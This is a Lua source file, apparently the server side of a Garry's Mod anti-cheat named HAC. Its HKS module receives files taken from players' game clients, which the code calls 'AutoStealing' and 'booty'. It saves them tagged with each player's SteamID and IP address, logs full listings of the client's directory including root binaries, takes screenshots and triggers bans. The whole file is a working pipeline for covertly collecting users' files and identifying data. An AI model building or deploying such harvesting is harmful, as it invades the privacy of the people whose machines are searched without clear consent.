HAC.HKS = {
	MAGIC = "\32\32\t\32\32\32", --For tagging stolen files
	Timeout = 120, --Time to wait for booty to send next file
	MaxAmt = 1100, --Max ammount of HKS files
	MaxBSize = 350000, --Max booty size, bytes
	MaxSmallSize = 40, --Smallest size, bytes
	MaxSmallCount = 10, --Max empty booty files
	MinAllSize = 249, --Min total files in ./ and above
	MaxAllSize = 3000, --Max total files in ./ and above
	IncomingID = table.Count(table.Tabify(HAC.CLIENT.White_HKS)), --ID of net strems, from list size
	LoggedUID = {}, --Unique IDs of files, for FF

}

HAC.StreamHKS = 0 --Do not rename, used in sv_WriteLCD in HSP!

local function CheckFakeBooty(ply, UID, Name, Size, CRC, AllSize, Data)
	local Check = Format("%s-%s - UID: %s", Name, CRC, UID)
	AllSize = tonumber(AllSize) --Total files
	Size = tonumber(Size) or 0 --Current file size

	--White_HKS
	if table.HasValue(HAC.CLIENT.White_HKS, UID) then
		--ply:FailInit("BADBOOTY_White_HKS: "..Check, HAC.Msg.HK_Fake)
		ply:LogOnly("BADBOOTY_White_HKS: " .. Check)

		return true
	end

	--White_HKS_Old
	if table.HasValue(HAC.CLIENT.White_HKS_Old, UID) then
		ply:FailInit("BADBOOTY_White_HKS_Old: " .. Check, HAC.Msg.HK_Fake)

		return true
	end

	--Too many
	if AllSize > HAC.HKS.MaxAmt then
		ply:FailInit("BADBOOTY_MaxAmt(" .. AllSize .. " > " .. HAC.HKS.MaxAmt .. ")", HAC.Msg.HK_Fake)

		return false
	end

	--Too big
	if Size > HAC.HKS.MaxBSize then
		ply:FailInit("BADBOOTY_MaxBSize(" .. Size .. " > " .. HAC.HKS.MaxBSize .. "): " .. Check, HAC.Msg.HK_Fake)

		--Delete
		if not Name:EndsWith(".lua") then
			HAC.Chk.Delete(ply, Name)
		end
		--Allow writing but kick

		return false
	end

	--Empty file
	if Size <= HAC.HKS.MaxSmallSize and not Data then
		ply.HAC_BadBootyTot = (ply.HAC_BadBootyTot or 0) + 1

		if ply.HAC_BadBootyTot >= HAC.HKS.MaxSmallCount then
			ply:FailInit("BADBOOTY_MaxSmallCount(" .. ply.HAC_BadBootyTot .. " >= " .. HAC.HKS.MaxSmallCount .. "): " .. Check, HAC.Msg.HK_Fake)
		end

		return false
	end
end

local function EndStream(ply, CurSize, AllSize, alldone)
	if not alldone and CurSize == AllSize then return end
	local Nick = ply:Nick()
	local Total = Format("[%s / %s] - [%s]", CurSize, AllSize, ply:Time())
	local Message = "HKS CUTOFF " .. Total

	if alldone then
		Message = "HKS complete " .. Total
		HAC.TellHeX(Message .. " - " .. Nick, NOTIFY_UNDO, 10, "npc/roller/remote_yes.wav")
	else
		HAC.TellHeX(Message .. " - " .. Nick, NOTIFY_ERROR, 10, "npc/roller/mine/rmine_explode_shock1.wav")
	end

	HAC.Print2HeX("\n" .. Message .. " - " .. Nick .. "\n\n")
	local Log = ply:GetLog("ds")

	if file.Exists(Log, "DATA") then
		HAC.file.Append(Log, "\n" .. Message .. "\n\n")
	end
end

local function UpdateTimeout(ply)
	local TID = "HAC.UpdateTimeout_" .. ply:SteamID()

	if ply.HAC_StealComplete then
		timer.Destroy(TID)

		return
	end

	timer.Create(TID, HAC.HKS.Timeout, 1, function()
		if not IsValid(ply) or not ply:VarSet("HAC_StealComplete") then return end
		local AllSize = ply.HACStealTotal or 0
		local CurSize = ply.HACLastCurSize or 0
		if CurSize == AllSize then return end
		--Timeout, ban
		local Err = Format("DS_TIMEOUT_%s [%s / %s], %s!", HAC.HKS.Timeout, CurSize, AllSize, (ply:Banned() and "Banning" or "Dropping"))

		if ply:Banned() then
			ply:DoBan(Err)
			ply:SetTimer(HAC.hac_wait:GetInt() / 6, "DS_TIMEOUT")
		else
			ply:FailInit(Err, HAC.Msg.HK_Timeout)
		end

		hook.Run("HKSComplete", ply, "! RX TIMEOUT")
	end)
end

--[[
	Name 	= F
	CRC 	= C
	CurSize = CS
	AllSize = AS
	Cont 	= T
]]
function HAC.HKS.Finish(str, len, sID, idx, Total, ply)
	if not IsValid(ply) then return end

	if not ValidString(str) then
		ply:FailInit("TXOk_NO_RX", HAC.Msg.HK_NoRX)

		return
	end

	--Dec
	local dec = util.JSONToTable(str)

	if type(dec) ~= "table" or table.Count(dec) <= 0 then
		ply:FailInit("TXOk_NO_DEC", HAC.Msg.HK_NoDec)

		return
	end

	--Init check
	if dec.TXOk then
		local TXList = tonumber(dec.TXList) or 0 --NoSend size
		local TXOk = tonumber(dec.TXOk) or 0

		if TXOk == HAC.HKS.IncomingID then
			--Double
			if ply.TXOk then
				ply:FailInit("TXOk_DOUBLE", HAC.Msg.HK_Double)

				return
			end

			ply.TXOk = true
		else
			ply:FailInit("TXOk_BAD_TXInit_" .. TXOk, HAC.Msg.HK_BadTX)
		end

		--Fake init
		if dec.TXInit then
			ply:FailInit("TXOk_FAKE_TXInit", HAC.Msg.HK_TXInit)
		end

		--List was fucked with!
		if TXList ~= HAC.HKS.IncomingID then
			ply:FailInit("TXOk_BAD_LIST (" .. TXList .. " != " .. HAC.HKS.IncomingID .. ")", HAC.Msg.HK_BadList)
		end

		return
	end

	--Valid Name, Cont
	if not (ValidString(dec.F) and ValidString(dec.T)) then
		local Res = Format("GimmeRX_BAD_RX: %s (%s)", tostring(dec.F), #tostring(dec.T))
		--ply:FailInit(Res, HAC.Msg.HK_BadRX)
		ply:LogOnly(Res)

		return
	end

	local Name = tostring(dec.F) or "GONE"
	local Cont = tostring(dec.T)
	local Size = #Cont
	local Data = Name:Check("data/")
	local Bucket = dec.IsBucket
	local CRC = util.CRC(Cont)

	--CRC
	if not ValidString(dec.C) then
		ply:FailInit("GimmeRX_CRC_NOT_STRING(" .. tostring(dec.C) .. ")", HAC.Msg.HK_BadRX15)
		dec.C = "E_" .. math.RandomEx()
	end

	if dec.C ~= CRC then
		if Bucket or Data then
			CRC = "E_" .. (Data and "DATA_" or Bucket and "Bucket_" or "") .. math.RandomEx()
		else
			local Res = Format("GimmeRX_CRC: %s (%s != %s)", Name, tostring(dec.C), CRC)
			--ply:FailInit(Res, HAC.Msg.HK_BadCRC)
			ply:LogOnly(Res)
		end
	end

	--CurSize, AllSize
	if tonumber(dec.CS) <= 0 or tonumber(dec.AS) <= 0 then
		ply:FailInit(Format("GimmeRX_BAD_RX2('%s'/'%s')", tonumber(dec.CS), tonumber(dec.AS)), HAC.Msg.HK_BadRX2)

		return
	end

	--Totals
	local AllSize = tonumber(dec.AS)

	if not ply.HACStealTotal then
		ply.HACStealTotal = AllSize
	end

	local CurSize = tonumber(dec.CS)
	ply.HACLastCurSize = CurSize
	ply.HACStreamHKS = (ply.HACStreamHKS or 0) + 1
	--Keywords
	HAC.Chk.Check(ply, Name, CRC, "HKSW", Cont)
	--Don't take no crap from anyone!
	local UID = util.CRC(Format("%s-%s", Name, CRC))
	if CheckFakeBooty(ply, UID, Name, Size, CRC, AllSize, Data) then return end
	if not IsValid(ply) then return end

	--Notify, start
	if not ply:VarSet("HAC_StealStarted") then
		HAC.TellHeX(Format("AutoStealing [%s] of %s's files, DO NOT kick/ban!", AllSize, ply:Nick()), NOTIFY_GENERIC, 10, "npc/roller/mine/rmine_blip1.wav")
		HAC.Print2HeX(Format("\n[HAC] - AutoStealing [%s] of %s's files\n\n", AllSize, ply:HAC_Info()))
	end

	--Make log
	local LogName = ply:GetLog("ds")

	if not Bucket and not file.Exists(LogName, "DATA") then
		local Log = Format("[HAC] / (GMod U%s) AutoStealer log for [%s] files created at [%s]\nFor: %s\n\n", VERSION, AllSize, HAC.Date(), ply:HAC_Info(1, 1))
		HAC.file.Write(LogName, Log)
	end

	--Update log
	local LogFile = HAC.file.Read(LogName)

	if LogFile and not LogFile:hFind(Name) then
		if not Bucket then
			HAC.file.Append(LogName, Format('\t"%s-%s", --%s\n', Name, CRC, UID))
		end

		local Log = Format("[HAC] - AutoStealing [%s / %s] - %s's %s %s\n", ply.HACStreamHKS, AllSize, ply:Nick(), Name, Size)
		HAC.Print2HeX(Log)
	end

	--UID log
	local UIDLog = ply:GetLog("ff")
	local UIDfile = HAC.file.Read(UIDLog)

	if not UIDfile or (UIDfile and not UIDfile:find(UID)) and not Bucket and not Data and not HAC.HKS.LoggedUID[UID] then
		HAC.HKS.LoggedUID[UID] = true
		HAC.file.Append(UIDLog, Format('\n\t"%s",', UID))
	end

	--Save
	local Ext = Data and "txt" or "lua"
	local sName = Name:Replace(".", "_"):VerySafe()
	local This = Format("%s/%s-%s.%s", ply.HAC_Dir, sName, CRC, Ext)
	if file.Exists(This, "DATA") then return end --plain for Data
	--Totals
	ply.HAC_HasWrittenFiles = true
	UpdateTimeout(ply)
	--Header
	local Head = Bucket and "Bucket" or Data and "DataFile" or "Dirty hacks"
	Cont = Format("--[[\n\t%s [#%s, %s, U:%s]\n\tHAC'd @ [%s]\n\t%s | %s <%s>\n\t===%s===\n]]\n\n%s", Name, #Cont, CRC, UID, HAC.Date(), ply:Nick(), ply:SteamID(), ply:IPAddress(), Head, Cont:gsub("\r\n", "\n"))
	--Write
	HAC.file.WriteEx(This, Cont)

	--Write MAGIC copy
	if not Data then
		local hThis = Format("%s/lua_hac/%s-%s.%s", ply.HAC_Dir, sName, CRC, Ext)

		if not file.Exists(hThis, "DATA") then
			local Tmp = ""

			for k, v in pairs(Cont:Split("\n")) do
				Tmp = Tmp .. v .. HAC.HKS.MAGIC .. "\n"
			end

			HAC.file.WriteEx(hThis, Tmp)
		end
	end

	--LCD
	HAC.StreamHKS = HAC.StreamHKS + 1 --LCD

	--End stream
	if CurSize ~= 0 and AllSize ~= 0 and CurSize >= AllSize and not Bucket then
		ply.HAC_StealComplete = true
		UpdateTimeout(ply)
		EndStream(ply, AllSize, AllSize, true)
		hook.Run("HKSComplete", ply, "# RX complete")

		if ply:Banned() then
			ply:DoBan("RX complete [" .. AllSize .. "], banning!")
			ply:SetTimer(HAC.hac_wait:GetInt() / 3.5, "HKSComplete")
			ply:HAC_EmitSound("uhdm/hac/whats_in_here.mp3", "WhatsInHere")
		end
	end
end

function HAC.HKS.Update(sID, idx, Split, Total, Buff, self)
	if Split == Total then return end --Small file, no spam
	local Per = math.Percent(Split, Total)
	print("# HKS update on " .. self:Nick(), " - " .. Per .. "% (" .. Split .. "/" .. Total .. ") - Rem: " .. self:BurstRem())
end

net.Hook(tostring(HAC.HKS.IncomingID), HAC.HKS.Finish, HAC.HKS.Update)
HAC.Init.Add("TXOk", HAC.Msg.HK_DSFail, INIT_VERY_LONG)

local Skip_IPF = {"garrysmod_new",}

--Gatehook, couldn't open / too big
function HAC.HKS.GateHook(self, Args1)
	--Fuckup with expression
	if Args1:Check("ICheck=IPF_R") and (Args1:InTable(Skip_IPF) or Args1:find(".txt") or (Args1:find("bin/") and Args1:find(".lua)", nil, true))) then
		--LogOnly
		self:LogOnly(Args1)
		--IPF, found stolen files!

		return INIT_DO_NOTHING
	elseif Args1:Check("ICheck=IPF") then
		return INIT_BAN
	end

	--No open
	if Args1:Check("ICheck=GFB_") and (Args1:FalsePos() or Args1:EndsWith("/materials/particle/old")) then return INIT_DO_NOTHING end
	--Log everything else
	self:LogOnly(Args1)

	return INIT_DO_NOTHING
end

HAC.Init.GateHook("ICheck=", HAC.HKS.GateHook)

--InProgress
function _R.Player:HKS_InProgress()
	return (self.HAC_HasWrittenFiles and self.HAC_StealStarted and not self.HAC_StealComplete)
end

--Disconnect
function HAC.HKS.PlayerDisconnected(ply)
	if ply.HAC_StealStarted and not ply.HAC_StealComplete then
		local AllSize = ply.HACStealTotal or 0
		local CurSize = ply.HACLastCurSize or 0

		if CurSize > 0 then
			EndStream(ply, CurSize, AllSize, false)
		end
	end
end

hook.Add("PlayerDisconnected", "HAC.HKS.PlayerDisconnected", HAC.HKS.PlayerDisconnected)

--ECheck
function HAC.HKS.CheckHisFiles(str, len, sID, idx, Total, self)
	if not IsValid(self) then return end

	if not ValidString(str) then
		self:FailInit("ECheck_NO_RX", HAC.Msg.HK_NoChkRX)

		return
	end

	--No table
	local AllFiles = util.JSONToTable(str)

	if type(AllFiles) ~= "table" or table.Count(AllFiles) <= 0 then
		self:FailInit("ECheck_NO_DEC", HAC.Msg.HK_NoChkDec)

		return
	end

	--No first entry
	if not ValidString(AllFiles[1]) then
		self:FailInit("ECheck_NO_TAB1 (dumped to echeck_err.txt)", HAC.Msg.HK_NoTAB1)
		file.Append("echeck_err-" .. self:SID() .. ".txt", str)

		return
	end

	--Too small
	if #AllFiles < HAC.HKS.MinAllSize then
		self:FailInit("ECheck_TOO_SMALL (" .. #AllFiles .. ")", HAC.Msg.HK_AllSmall)
	end

	--Too big
	if #AllFiles >= HAC.HKS.MaxAllSize then
		local Str = "ECheck_TOO_BIG (" .. #AllFiles .. " > " .. HAC.HKS.MaxAllSize .. ")"
		self:FailInit(Str, HAC.Msg.HK_AllBig)
		self:LagWarning(Str)
	end

	--Double
	if self.HAC_ECheckInit then
		self:FailInit("ECheck_Double", HAC.Msg.HK_Double)

		return
	end

	self.HAC_ECheckInit = true
	--Log all files
	self.HAC_AllFiles = AllFiles
	HAC.file.WriteTable(self:GetLog("raw/allfiles"), AllFiles, '\n\t"%s",') --Messy!
	--Scan all files
	local ContRoot_CRC = ""
	local ContRoot = ""
	local RootFiles = 0

	for k, v in pairs(AllFiles) do
		HAC.Chk.Check(self, v, "ALL", "ECheckW")

		--Log root files
		if v:Check("R/") or v:Check("M/") then
			RootFiles = RootFiles + 1
			ContRoot = Format('%s\n\t"%s",', ContRoot, v)
			--Remove "R/"
			v = v:sub(3) --"R/bin/server.dll"
			--Path
			local Path = v
			local fName = v

			if v:find("/") or v:find("\\") then
				Path = v:GetPathFromFilename():Trim("/")
				fName = v:GetFileFromFilename()
			end

			--v
			ContRoot_CRC = Format('%s\n\t["%s"] = %d, --(v) %s', ContRoot_CRC, util.CRC(v), #v, v)
			--Add filename
			ContRoot_CRC = Format('%s\n\t["%s"] = %d, --%s', ContRoot_CRC, util.CRC(fName), #fName, fName)

			--Only add path if exists
			if fName ~= Path then
				ContRoot_CRC = Format('%s\n\t["%s"] = %d, --(/)%s', ContRoot_CRC, util.CRC(Path), #Path, Path)
			end
		end
	end

	AllFiles = nil
	HAC.HKS.FileListCheck()

	--Log ROOT files
	if RootFiles > 0 then
		--Log
		self:LogOnly("! HAS ROOTFILES: " .. RootFiles) --fixme, log this first before ECheck
		self:LogOnly(ContRoot .. "\n")
		--Root list
		local Log = self:GetLog("rootfile", util.CRC(ContRoot))

		if not file.Exists(Log, "DATA") then
			HAC.file.Write(Log, ContRoot)
			--Tell HeX
			HAC.Print2HeX(Format("\n[HAC] ROOT FILES, %s on %s\n", RootFiles, self:Nick()))
			--SC
			self:TakeSC()
		end

		--Root CRCs
		local Log = self:GetLog("crc_root", util.CRC(ContRoot_CRC))

		if not file.Exists(Log, "DATA") then
			HAC.file.Append(Log, ContRoot_CRC)
		end
	end

	ContRoot = nil
	ContRoot_CRC = nil
end

net.Hook(tostring(HAC.HKS.IncomingID * 4), HAC.HKS.CheckHisFiles)
HAC.Init.Add("HAC_ECheckInit", HAC.Msg.SE_ECheck, INIT_LONG)

--MakeFileList
function _R.Player:MakeFileList()
	if self:VarSet("HAC_DoneMakeFileList") then return end

	if self.HAC_AllFiles and #self.HAC_AllFiles > 3000 then
		self:LagWarning("MakeFileList, self.HAC_AllFiles > 3000")
	end

	self:timer(1.5, function()
		self.HAC_DoingFiles = true
	end)
end

--Check for MakeFileList
function HAC.HKS.FileListCheck()
	local ret, err = pcall(function()
		for k, v in Humans() do
			if not (v.HAC_DoingFiles and v.HAC_AllFiles) then continue end
			v.HAC_DoingFiles = false
			--Tell
			print("[HAC] Logged all " .. #v.HAC_AllFiles .. " of " .. v:HAC_Info() .. "'s files")
			--Build
			local Cont = ""

			for k, v in pairs(v.HAC_AllFiles) do
				Cont = Cont .. '\n\t"' .. v .. '",'
			end

			--local Cont = HAC.file.WriteTable(Path,Tab, '\n\t"%s",') --will not work, can;t do CRC
			--fixme, write temp, read and CRC, delete. HAC.file.WriteCRC?
			--Log
			local Log = v:GetLog("file", util.CRC(Cont))

			if not file.Exists(Log, "DATA") then
				HAC.file.Write(Log, Cont)
				Cont = nil

				--Log if banned
				v:timer(3, function()
					if v:BannedOrFailed() then
						v:WriteLog("# Logged all " .. #v.HAC_AllFiles .. " files")
						v.HAC_AllFiles = nil
					end
				end)
			end
		end
	end)

	if err then
		debug.ErrorNoHalt("HAC.HKS.FileListCheck failed again (" .. tostring(err) .. "), (" .. tostring(ret) .. ")")

		for k, v in Everyone() do
			if v.HAC_AllFiles then
				HAC.file.WriteTable("files_" .. v:SID() .. ".txt", v.HAC_AllFiles) --fixme!
			end
		end
	end
end

timer.Create("HAC.HKS.FileListCheck", 0.5, 0, HAC.HKS.FileListCheck)
